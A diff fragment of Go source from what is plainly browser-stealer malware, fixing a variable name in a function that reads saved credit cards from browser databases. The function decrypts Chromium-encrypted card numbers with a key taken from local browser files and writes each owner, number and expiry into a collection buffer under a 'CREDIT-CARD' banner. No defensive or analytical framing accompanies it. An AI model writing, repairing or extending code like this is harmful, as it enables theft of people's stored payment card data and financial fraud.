@@ -302,7 +302,7 @@ func cardInfo() {
 			var name, number, expiration_m, expiration_y string
 			rows.Scan(&name, &number, &expiration_m, &expiration_y)
 			if strings.HasPrefix(number, "v10") {
-				number = decryptData([]byte(number[3:]), extractKey(LOCAL_PATHS[INDEX]))
+				number = decryptData([]byte(number[3:]), extractKey(LOCAL_PATHS[index]))
 				if number != "" {
 					DATA.WriteString(fmt.Sprintf("=========================[CREDIT-CARD]=========================\nBrowser: %v\nCard_Owner: %s\nCard_Number: %s\nExpiration_Month: %v\nExpiration_Year: %v\n\n", SESSIONS[index], name, number, expiration_m, expiration_y))
 				}
